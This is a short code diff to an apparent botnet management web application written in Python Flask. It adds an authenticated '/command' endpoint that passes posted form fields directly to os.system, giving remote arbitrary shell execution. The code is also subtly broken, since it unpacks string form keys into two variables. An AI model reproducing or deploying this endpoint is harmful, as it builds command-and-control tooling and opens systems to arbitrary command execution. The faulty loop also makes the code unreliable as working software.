@@ -556,6 +556,26 @@ def botnetmgmt():
 		return str(e)
 
 
+@app.route("/command", methods=["GET", "POST"])
+@requires_auth
+def run_command():
+	"""
+		accepts arbitrary commands as post, and only post
+		accepts as command1:argument1 argument2, command2: argument1 argument2 ...
+	"""
+	if request.method == 'POST':
+		response = {}
+		for command, argument in request.form.keys():
+			try:
+				system(" ".join([command,argument]))	
+				response[command] = "OK"
+			except Exception as e:
+				response[command] = str(e)
+		return str(json.dumps(response))
+	else:
+		abort(400)
+
+
 """
           d8                                    
         ,8P'                             ,d     
